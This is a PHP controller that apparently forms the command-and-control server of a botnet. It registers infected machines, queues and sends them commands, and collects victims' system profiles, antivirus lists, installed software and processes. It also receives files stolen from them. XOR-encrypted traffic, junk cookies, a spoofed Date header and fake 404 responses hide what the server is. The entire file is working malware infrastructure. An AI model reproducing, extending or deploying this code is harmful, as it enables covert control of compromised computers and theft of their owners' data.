<?php

namespace api\controllers;

use Yii;
use yii\helpers\Json;
use yii\rest\Controller;
use yii\web\UploadedFile;
use yii\helpers\FileHelper;
use common\models\Bots;
use common\models\Commands;
use common\models\Groups;
use backend\models\Sik;
use yii\base\Security;
use yii\db\Expression;
use yii\web\Request;
use common\models\Networks;


class SiteController extends Controller
{
    public function actionCreate()
    {
        if(!isset($_COOKIE['group'])){
            $group = 'Unrecognized';
        }else{
            $group = $_COOKIE['group'];
        }
        $g = Groups::findOne(['group' => $group]);

        $headers = Yii::$app->request->headers;
        $agent = (isset($headers['User-Agent'])) ? $headers['User-Agent'] : ' User-Agent N/A ';
        $host = (isset($headers['Host'])) ? $headers['Host'] : ' Host N/A ';
        $realip = (isset($headers['realip'])) ? $headers['realip'] : ' IP N/A ';
        if ($headers->has('realip')){
            $real_ip = $headers->get('realip');
        }else{
            $real_ip = '0.0.0.0';
        }
        $r = explode('/',Yii::$app->request->url);

        $isValid = Bots::botValidate($r[1]);

     
        $m = new Bots();
        $m->bot = $r[1];
        $m->group = $group;
        $m->created_at = new Expression('NOW()');
        $m->updated_at = new Expression('NOW()');
        $m->ip = $realip;
        $m->country = Yii::$app->geoip->lookupCountryCode($realip);
        $m->status = 3; // chastity
        $m->type = ($isValid) ? 0 : 1;

        // Search for network
        
        if($real_ip != '0.0.0.0' && $m->type == 0){ // if valid IP and realip sets
            $iplower = Networks::findOne(['ipint'=>ip2long($real_ip)]); // hit to single IP or lower mask value
            if($iplower){
                $m->type = $iplower->destination;
            }else{ // try range
                $iprange = Networks::find()->where(['>=','ipintto',ip2long($real_ip)])->andWhere(['<=','ipint',ip2long($real_ip)])->one();
                if($iprange && isset($iprange->destination)){
                    $m->type = $iprange->destination;
                }
            }
            
        }


        $m->save(false);

        Yii::info('Bot '.$r[1].' at group '.$group.' was born'.$realip.':'.$agent.':'.$host, $category = 'botinfo');
        
        $output = '0 301';
        $response = $this->cryptor($output,$r[1]); // encrypt
        Yii::$app->response->headers->set('Content-Length', strlen($response));

        $time = new \DateTime('NOW');
        $now = $time->format('Y-m-d'); // base format
        $timenow = $time->format('Y-m-d H:i:s'); // system time format
        $sig_date = '';
        $sig_key = '';

        $sig = Sik::find()->where('created_at = :created_at', [':created_at' => $now])->one();
        if($sig){
            $sig_date = $sig->date;
            $sig_key = $sig->key;
        }

        header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
        
        // set cookie junk 
        if($sig){
            $cooks = Groups::junkCookie($g->cookievalue,$sig->key);
            foreach ($cooks as $key => $value) {
                setcookie($key, $value);
            }
        }

        if($isValid){
            Yii::$app->response->content = $response;
        }else{
            throw new \yii\web\NotFoundHttpException();
        }       
        
        
    }

    public function actionRequest()
    {
        $r = explode('/',Yii::$app->request->url);
        $isValid = Bots::botValidate($r[1]);
        
        $bot_id = $r[1];
        
        $headers = Yii::$app->request->headers;
        $agent = (isset($headers['User-Agent'])) ? $headers['User-Agent'] : ' User-Agent N/A ';
        $host = (isset($headers['Host'])) ? $headers['Host'] : ' Host N/A ';
        $realip = (isset($headers['realip'])) ? $headers['realip'] : ' IP N/A ';
        $hostip = Yii::$app->request->userIP;
        //print_r($hostip);die();
        
        $m = Commands::find()->andWhere(['bot_id' => Bots::findByBot($bot_id)['id']])->andWhere(['status' => 0])->orderBy(['created_at' => SORT_DESC])->one(); // find last command
        if($m){ 

            $output = $m->command;
            if($m->commandtype!=0){
                $m->status = 1; // set "command sent" status if command not 0!
                $m->save(false);
            }
            
            $b = Bots::findByBot($bot_id);
            if($m->commandtype!=0){
                $b->busy = 1; // set "status busy" to bot if not 0
            }else{
                $b->busy = 0;
            }
            $b->save(false);
            $b->updated_at = new Expression('NOW()');
            $b->status = ($b->status == 3) ? 3 : 1; // newbie stay online
            if($b->group=="" || $b->group=="Unrecognized"){
                if(isset($_COOKIE['group'])){
                    $b->group = $_COOKIE['group'];
                    if($b->ip==''){
                        $b->ip = $realip;
                        $b->country = Yii::$app->geoip->lookupCountryCode($realip);
                    }
                    $b->save(false);
                }
            }

        }else{
            $b = Bots::findByBot($bot_id);
            if($b){
                $b->updated_at = new Expression('NOW()');
                $b->status = ($b->status == 3) ? 3 : 1;
                if($b->ip==''){
                    $b->ip = $realip;
                    $b->country = Yii::$app->geoip->lookupCountryCode($realip);
                }
                $b->save(false);
                // test mode/ comment later !!!!!!!!!!!!!!!!!!!!!!!!
                if($b->group=="" || $b->group=="Unrecognized"){
                    if(isset($_COOKIE['group'])){
                        $b->group = $_COOKIE['group'];
                        $b->save(false);
                    }
                }
                $output = '0 302';
            }
        }

        Yii::info('Bot '. $r[1] . ' gets command ' . $output.':'.$realip.':'.$agent.':'.$host, $category = 'botinfo');
        
        
        $response = $this->cryptor(str_replace("\\r\\n", hex2bin('0d').hex2bin('0a'), $output),$bot_id); //encrypt
        //$response = str_replace("\\r\\n", hex2bin('0d').hex2bin('0a'), $output); // test
        $time = new \DateTime('NOW');
        $now = $time->format('Y-m-d'); // base format
        $timenow = $time->format('Y-m-d H:i:s'); // system time format
        $sig_date = '';
        $sig_key = '';

        $sig = Sik::find()->where('created_at = :created_at', [':created_at' => $now])->one();
        if($sig){
            $sig_date = $sig->date;
            $sig_key = $sig->key;
        }
        if($isValid){
            header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
            $g = Groups::findOne(['group' => $b->group]);
           
            // set cookie junk 
            if($sig){
                $cooks = Groups::junkCookie($g->cookievalue,$sig->key);
                foreach ($cooks as $key => $value) {
                    setcookie($key, $value);
                }
            }
        
            Yii::$app->response->headers->set('Content-Length', strlen($response));
            Yii::$app->response->content = $response;
        }else{
            die();
        }
        
    }

    public function actionResponse()
    {
        $r = explode('/',Yii::$app->request->url);
        $isValid = Bots::botValidate($r[1]);
        $bot_id = $r[1];
        $fail = false;
        
        // last command
        $m = Commands::find()->andWhere(['bot_id' => Bots::findByBot($bot_id)['id']])->andWhere(['status' => 1])->orderBy(['created_at' => SORT_DESC])->one();

        $b = Bots::findByBot($bot_id);

        $g = Groups::findOne(['group' => $b->group]);

        if($m){ 
            Yii::info('Bot '. $r[1] . ' response command ' . $m->command, $category = 'botinfo');


            $commandtype = explode('/',$m->command)[0];

            $getBody = $this->cryptor(Yii::$app->request->rawBody,$bot_id); // release
            //$getBody = Yii::$app->request->rawBody; // test

                    
            // debug with file
            //$filename = "/home/user/test.txt";
            //$filename = "/var/www/html/backdoor/test.xor";
            //$handle = fopen($filename, "r");
            //$contents = fread($handle, filesize($filename));
            //fclose($handle);
            //$getBody = $this->cryptor($contents,$bot_id);
            //$getBody = $contents;

            parse_str($getBody,$arr);

            if($commandtype==1){ // Getsysinfo parsed into a differet fields
                /*if(array_key_exists('group',$arr)){
                    if(gettype($arr['group'])=='string'){
                        $b->group = $arr['group'];
                    }
                }*/
                if(array_key_exists('path',$arr)){
                    if(gettype($arr['path'])=='string'){
                        $b->path = $arr['path'];
                    }
                }
                // os[1]=W100&os[2]=9200&os[3]=30
                /*if(array_key_exists('os',$arr)){
                    if(isset($arr['os']) && gettype($arr['os'])=='string'){
                        $b->osbuild = explode('|',$arr['os'])[0];
                        $b->os = $arr['os'];
                    }
                }*/
                if(array_key_exists('os',$arr)){
                    if(isset($arr['os'])){
                        if(gettype($arr['os'])=='array'){
                            $b->os = json_encode($arr['os']);
                            $b->osbuild = $arr['os'][1];
                        }elseif(gettype($arr['os'])=='string'){
                            $b->os = json_encode(explode('|',$arr['os']));
                            $b->osbuild = $arr['os'][0];
                        }
                    }
                }
                
                if(array_key_exists('arch',$arr)){
                    if(gettype($arr['arch'])=='string'){
                        $b->arch = $arr['arch'];
                    }
                }
                if(array_key_exists('uname',$arr)){
                    if(gettype($arr['uname'])=='string'){
                        $b->uname = $arr['uname'];
                    }
                }
                if(array_key_exists('cname',$arr)){
                    if(gettype($arr['cname'])=='string'){
                        $b->cname = $arr['cname'];
                    }
                }
                if(array_key_exists('av',$arr) && array_key_exists('avp',$arr)){
                    if(isset($arr['av']) && isset($arr['avp'])){
                        if(gettype($arr['av'])=='array' && gettype($arr['avp'])=='array'){
                            $a = array();
                            foreach ($arr['av'] as $key => $value) {
                                array_push($a, [$arr['av'][$key],$arr['avp'][$key]]);
                            }
                            $b->av = json_encode($a);
                        }
                    }
                }
                if(array_key_exists('net',$arr)){
                    if(gettype($arr['net'])=='string'){
                        $b->net = $arr['net'];
                    }
                }
                if(array_key_exists('domain',$arr)){
                    if(gettype($arr['domain'])=='string'){
                        $b->domain = $arr['domain'];
                    }
                }
                if(array_key_exists('trust',$arr)){
                    if(gettype($arr['trust'])=='string'){
                        $b->trust = $arr['trust'];
                    }
                }
                if(array_key_exists('soft',$arr)){
                    if(isset($arr['soft'])){ // w/o vesion
                        if(gettype($arr['soft'])=='array'){
                            $a = array();
                            foreach ($arr['soft'] as $key => $value) {
                                array_push($a, $arr['soft'][$key]);
                            }
                            $b->soft = json_encode($a);
                        }
                    }
                }
                if(array_key_exists('cpu',$arr)){
                    if(isset($arr['cpu'])){ // w/o vesion
                        if(gettype($arr['cpu'])=='array'){
                            $a = array();
                            foreach ($arr['cpu'] as $key => $value) {
                                array_push($a, $arr['cpu'][$key]);
                            }
                            $b->cpu = json_encode($a);
                        }
                    }
                }
                if(array_key_exists('drive',$arr)){
                    if(isset($arr['drive'])){ // w/o vesion
                        if(gettype($arr['drive'])=='array'){
                            $a = array();
                            foreach ($arr['drive'] as $key => $value) {
                                array_push($a, $arr['drive'][$key]);
                            }
                            $b->drive = json_encode($a);
                        }
                    }
                }
                if(array_key_exists('motherboard',$arr)){
                    if(gettype($arr['motherboard'])=='string'){
                        $b->motherboard = $arr['motherboard'];
                    }
                }
                if(array_key_exists('memory',$arr)){
                    if(gettype($arr['memory'])=='string'){
                        $b->memory = $arr['memory'];
                    }
                }
                if(array_key_exists('vm',$arr)){
                    if(gettype($arr['vm'])=='string'){
                        $b->memory = $arr['vm'];
                    }
                }
                if(array_key_exists('sb',$arr)){
                    if(gettype($arr['sb'])=='string'){
                        $b->memory = $arr['sb'];
                    }
                }
                if(array_key_exists('ip',$arr)){
                    if(gettype($arr['ip'])=='string'){
                        $b->ip = $arr['ip'];
                        $b->country = Yii::$app->geoip->lookupCountryCode($arr['ip']);
                    }
                }
                if(array_key_exists('locale',$arr)){
                    if(gettype($arr['locale'])=='string'){
                        $b->locale = $arr['locale'];
                    }
                }
                if(array_key_exists('tz',$arr)){
                    if(gettype($arr['tz'])=='string'){
                        $b->tz = $arr['tz'];
                    }
                }
                if(array_key_exists('ps',$arr)){
                    if(isset($arr['ps'])){ // w/o vesion
                        if(gettype($arr['ps'])=='string'){
                            $a = explode(chr(13).chr(10),$arr['ps']);
                            $b->ps = json_encode($a);
                        }elseif(gettype($arr['ps'])=='array'){
                            $b->ps = json_encode($arr['ps']);
                        }
                    }
                }
            }
            if($commandtype==16 && isset(Yii::$app->request->headers['content-length'])){
                if(isset(Yii::$app->request->headers['content-disposition'])){
                    $name = Yii::$app->request->headers['content-disposition'];
                }else{
                    $name = 'Reseived.file';
                    if(isset($m->usercommand)){
                        $parseUserCommand = explode(chr(9),$m->usercommand);
                        if(isset($parseUserCommand[5])){
                            $getComLine = explode('\\',$parseUserCommand[5]);
                            if(isset($getComLine) && gettype($getComLine=='array')){
                                $name = end($getComLine);
                            }
                        }
                    }
                }
                // remove junk
                $name = str_replace('"','',substr($name,strpos($name, '"'))); // TODO need redo on regex (?:"([^,]*)")

                $size = Yii::$app->request->headers['content-length'];

                $security = new Security();
                $dir = $security->generateRandomString(4);
                
                // make web access directory
                FileHelper::createDirectory(Yii::getAlias('@absPath').'/api/web/downloads/'.$b->bot.'/'.$dir);
                $destfile = Yii::getAlias('@absPath').'/api/web/downloads/'.$b->bot.'/'.$dir.'/'.$name;
                $webfile = '/downloads/'.$b->bot.'/'.$dir.'/'.$name;

                if(!file_put_contents($destfile, $getBody)){
                    $getBody = 'msg=File is not received';
                }else{
                    //$flink = '<b><a data-pjax="0" href="'.$webfile.'">'.$name.'</a></b>';
                    $getBody = 'file_Name='.$name.'&size='.$size.'&file_link='.'<a data-pjax="0" href="'.$webfile.'">Download</a>';
                }
                
            }
           
            $b->busy = 0; // unblock bot
            $b->updated_at = new Expression('NOW()');
            $b->status = 1;
            $b->save(false);

            $m->result = $getBody;
            $m->status = 2; // set success status
            $m->save(false);
//print_r($m);die();
            
            // is any non nop pendings & waitings exist?
            Commands::updateAll(['status' => 3], ['and',       ['and', ['bot_id' => Bots::findByBot($bot_id)['id']], ['status' => 1] ], ['>','commandtype',0] ]        );

            $output = '0 303';
        }else{
            Yii::info('Bot '. $r[1] . ' knocked ', $category = 'botinfo');
            $output = '0 304';
        }
         
        $response = $this->cryptor($output,$bot_id); // encrypt
        //$response = $output; // nocrypt for tests
        Yii::$app->response->headers->set('Content-Length', strlen($response));
        $time = new \DateTime('NOW');
        $now = $time->format('Y-m-d'); // base format
        $timenow = $time->format('Y-m-d H:i:s'); // system time format
        $sig_date = '';
        $sig_key = '';

        $sig = Sik::find()->where('created_at = :created_at', [':created_at' => $now])->one();
        if($sig){
            $sig_date = $sig->date;
            $sig_key = $sig->key;
        }
        if($isValid){
            header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
            
            // set cookie junk 
            if($sig){
                $cooks = Groups::junkCookie($g->cookievalue,$sig->key);
                foreach ($cooks as $key => $value) {
                    setcookie($key, $value);
                }
            }
            
            Yii::$app->response->content = $response;
        }else{
            throw new \yii\web\NotFoundHttpException();
        }
    }

    public function actionMessage()
    {
        $r = explode('/',Yii::$app->request->url);
        $bot_id = $r[1];
        $isValid = Bots::botValidate($r[1]) ? 0 : 1;
        $b = Bots::findByBot($bot_id);

        $g = Groups::findOne(['group' => $b->group]);


        Yii::info('Bot '. $r[1] . ' sent a message ', $category = 'botinfo');

        // Message command
        $m = New Commands();
        $m->bot_id = $b->id;
        $m->created_at = new Expression('NOW()');
        $m->status = 2;
        $m->command = '4';
        $m->commandtype = 4;
        if(Yii::$app->request->rawBody!=''){
            $m->result = $this->cryptor(Yii::$app->request->rawBody,$bot_id); // decrypt
        }
        $m->save(false);

        $b->updated_at = new Expression('NOW()');
        $b->status = 1;
        $b->save(false);

        $time = new \DateTime('NOW');
        $now = $time->format('Y-m-d'); // base format
        $timenow = $time->format('Y-m-d H:i:s'); // system time format
        $sig_date = '';
        $sig_key = '';

        $sig = Sik::find()->where('created_at = :created_at', [':created_at' => $now])->one();
        if($sig){
            $sig_date = $sig->date;
            $sig_key = $sig->key;
        }
        if($isValid===0){
            header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
            
            // set cookie junk 
            if($sig){
                $cooks = Groups::junkCookie($g->cookievalue,$sig->key);
                foreach ($cooks as $key => $value) {
                    setcookie($key, $value);
                }
            }
        }else{
            throw new \yii\web\NotFoundHttpException();
        }
    }

    public function actionIndex()
    {
        throw new \yii\web\NotFoundHttpException();
    }

    public function cryptor($source, $key)
    {
        // return $source; // comment line to use cryptor
        if(!isset($source) || !isset($key)){
            return '';
        }

        $t = str_split($source);

        $res = '';

        $key_array = str_split($key,2);
        foreach ($key_array as $k => $value) {
            $key_array[$k] = hexdec($value);
        }
        
        $parts = str_split($source,count($key_array));
        
        foreach ($parts as $value_parts) {
            $xor_array = array();
            
            $value_array = str_split($value_parts);

            foreach ($value_array as $k => $value) {
                $value_array[$k] = ord($value);
            }

            for ($j = 0; $j < min(count($value_array),count($key_array)); $j++){
                $s = dechex($value_array[$j] ^ $key_array[$j]);

                if(strlen($s)==1){
                    $s = '0'.$s;
                }
                array_push($xor_array, hex2bin($s));
            }

            foreach ($xor_array as $k => $value) {
                $res .= $value;
            }
        }

        return $res;
    }
}
